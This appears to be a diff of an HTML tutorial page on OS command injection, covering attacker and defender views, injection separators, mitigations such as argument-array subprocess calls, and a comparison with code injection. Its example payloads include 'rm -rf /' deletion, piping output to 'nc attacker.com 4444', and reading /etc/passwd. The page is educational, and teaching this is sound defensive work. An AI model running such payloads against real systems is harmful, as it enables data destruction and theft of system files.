@@ -1,151 +1,114 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Command Injection</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      line-height: 1.6;
-      background: #f4f4f4;
-      margin: 0;
-      padding: 0;
-    }
-    .container {
-      max-width: 900px;
-      margin: auto;
-      overflow: hidden;
-      padding: 20px;
-    }
-    .card {
-      background: #fff;
-      padding: 20px;
-      margin-bottom: 20px;
-      border-radius: 8px;
-      box-shadow: 0 8px 30px rgba(11,26,43,0.08);
-    }
-    h1, h2, h3 {
-      color: #333;
-    }
-    pre {
-      background: #272822;
-      color: #f8f8f2;
-      padding: 15px;
-      border-radius: 5px;
-      overflow-x: auto;
-    }
-    code {
-      background: #eee;
-      padding: 2px 6px;
-      border-radius: 3px;
-      font-family: Consolas, monospace;
-    }
-    ul {
-      margin-left: 20px;
-    }
-  </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Command Injection</title>
+<style>
+body {
+    font-family: Arial, sans-serif;
+    background: #f4f4f4 url('cloud.jpg') no-repeat top center;
+    background-size: cover;
+    padding: 20px;
+    color: #111;
+}
+
+.card {
+    background: white;
+    border-radius: 12px;
+    box-shadow: 0 8px 30px rgba(11,26,43,0.08);
+    padding: 20px;
+    margin-bottom: 20px;
+    white-space: pre-wrap;
+}
+
+h2 {
+    margin-top: 0;
+}
+
+code {
+    background-color: #eee;
+    padding: 2px 4px;
+    border-radius: 4px;
+}
+</style>
 </head>
 <body>
-  <div class="container">
-    <div class="card">
-      <h1>Command Injection</h1>
-      <p>Occurs mainly due to improper Input Validation: Checking TLFR type, format, range, or pattern.</p>
-      <p>Command injection occurs when an attacker is able to execute arbitrary system commands on a server or host by exploiting un sanitized input in an application.</p>
-      <p>Application passes user input directly to a system shell or command interpreter.</p>
-      <p>If input is not properly validated or sanitized, attackers can append commands.</p>
-    </div>
 
-    <div class="card">
-      <h2>Examples</h2>
-      <pre><code>import os
+<div class="card">
+<h2>1. Overview:</h2>
+Command injection occurs when untrusted user input is passed directly to a system shell or command interpreter. This allows attackers to execute arbitrary system commands on the host operating system. Unlike code injection (which targets the application runtime, e.g., Python, PHP), command injection specifically targets the OS layer.
+</div>
 
-user_input = "google.com; rm -rf /"
-os.system("ping -c 4 " + user_input)
+<div class="card">
+<h2>2. Vulnerability from an Attacker Perspective:</h2>
+If an application takes user input and builds a command string without proper sanitization or parameterization, the attacker can "break out" of the intended command context and run arbitrary commands.
 
-Attacker provides: google.com; rm -rf /
-The program runs as: ping -c 4 google.com; rm -rf /
-</code></pre>
+<b>Example:</b>
 
-      <pre><code>import os
+import os  
+user_input = input("Enter filename: ")  
+os.system(f"cat {user_input}")  
 
-user_command = input("Enter the command: ")  
-print("Running your command...\n")  
-os.system(user_command)
+If the user types:  
 
-user types "ifconfig", it gets it. great but attacker. passing unchecked input directly into a shell command.
-</code></pre>
+file.txt; rm -rf /  
 
-      <pre><code>import os
+The attacker injects an additional command after the semicolon. The system executes both commands, potentially deleting all files.
 
-user_command = input("Enter the command: ")  
-os.system("echo " + user_input)
+<b>Impact:</b>  
+- File disclosure: Access sensitive files like /etc/passwd.  
+- File modification/deletion: Corrupt or destroy data.  
+- Remote access: Install backdoors or launch reverse shells.  
+- Privilege escalation: If the application runs as root/admin, full system compromise.  
+- Pivoting: Move laterally to other systems.  
+</div>
 
-and user input is: ; rm -f *
-</code></pre>
+<div class="card">
+<h2>2.1 Attempts of an Attacker:</h2>
+Attackers often try special characters or separators to inject extra commands:
 
-      <p>In a shell (like Bash or CMD), the operator <code>&&</code> means: "Run the command on the left, and if it succeeds, run the one on the right."</p>
-    </div>
+- `;` → Run another command.  
+- `&&` → Run next command only if previous succeeds.  
+- `||` → Run next command only if previous fails.  
+- `|` → Pipe output to another command.  
+- Backticks or $() → Command substitution.  
 
-    <div class="card">
-      <h2>Dangerous Shell Characters</h2>
-      <ul>
-        <li><code>;</code> Run multiple commands sequentially</li>
-        <li><code>``</code> (backticks) Execute command inside them first</li>
-        <li><code>$(...)</code> Same as backticks — runs inner command</li>
-      </ul>
-    </div>
+<b>Example payloads:</b>  
+- `test.txt; whoami`  
+- `test.txt && id`  
+- `test.txt | nc attacker.com 4444`  
+- `$(cat /etc/passwd)`  
 
-    <div class="card">
-      <h2>Preventions from Defensive Perspective</h2>
-      <ol>
-        <li><b>Never trust user input</b><br>
-          Treat all input as hostile until proven otherwise.<br>
-          Validate against strict allow-lists, not block-lists.
-        </li>
-        <li><b>Input validation</b><br>
-          Ensure input matches expected patterns/types.<br>
-          Example: if input should be a filename → only allow alphanumeric, dots, underscores.<br>
-          Reject shell metacharacters (<code>; | &gt; &lt; $ ( ) { } [ ] * ?</code>).
-        </li>
-        <li><b>Input sanitization</b><br>
-          Escape or neutralize unsafe characters before passing to a shell.<br>
-          Example: safely escape arguments with libraries (<code>shlex.quote</code> in Python, parameterized APIs in other languages).
-        </li>
-        <li><b>Avoid dynamic command execution</b><br>
-          Do not build shell commands with string concatenation (<code>os.system("cmd " + user_input)</code>).<br>
-          Use safe APIs that do not invoke a shell:<br>
-          Python → <code>subprocess.run(["ls", "-l", filename])</code><br>
-          Java → <code>ProcessBuilder</code>
-        </li>
-      </ol>
+Once a foothold is gained, attackers can combine OS commands to exfiltrate data, establish persistence, or escalate privileges.
+</div>
 
-      <pre><code>import subprocess
+<div class="card">
+<h2>3. Vulnerability from a Defender Perspective:</h2>
+<b>Why it happens:</b>  
+- Direct concatenation of user input into system commands.  
+- Lack of input validation/sanitization.  
+- Using functions like `system()`, `exec()`, `popen()` unsafely.  
 
-cmd = input("Enter safe command like 'ipconfig': ") 
-try:
-    result = subprocess.run([cmd], check=True)
-except Exception as e:
-    print("Error:", e)
-</code></pre>
+<b>Mitigation strategies:</b>  
+- Never trust user input. Validate type, length, and format.  
+- Use safe APIs (parameterized system calls).  
+- Avoid passing user input into a shell; use functions that take arguments as arrays (e.g., `subprocess.run(["cat", filename])` in Python).  
+- Apply allowlists: Only accept known-good inputs (e.g., filenames from a safe directory).  
+- Use least privilege: Run applications with minimal OS rights.  
+- Monitor and log unusual command executions.  
+</div>
 
-      <p>This still trusts user input — but doesn't invoke a full shell, so it's safer than os.system().</p>
+<div class="card">
+<h2>4. Extras:</h2>
+<b>Command Injection vs Code Injection:</b>  
 
-      <ol start="5">
-        <li><b>Least privilege</b><br>
-          Run the process with minimal permissions (non-root, chroot/containerized).<br>
-          Prevent lateral movement if exploited.
-        </li>
-        <li><b>Contextual encoding (if shell execution is unavoidable)</b><br>
-          Properly encode input before passing it into the shell so it’s treated as data, not code.<br>
-          Example: quotes around filenames → <code>"safe filename.txt"</code>
-        </li>
-        <li><b>Monitoring &amp; detection</b><br>
-          Look for suspicious process execution (e.g., ;, &&, unusual commands).<br>
-          Alert on unexpected child processes spawned by web apps (like sh, bash, powershell).
-        </li>
-      </ol>
-    </div>
-  </div>
+- Command Injection → attacker executes OS-level commands (system()).  
+- Code Injection → attacker executes code within the app runtime (eval, exec in Python).  
+
+Command Injection = “talking to the OS.”  
+Code Injection = “becoming the app itself.”  
+</div>
+
 </body>
 </html>
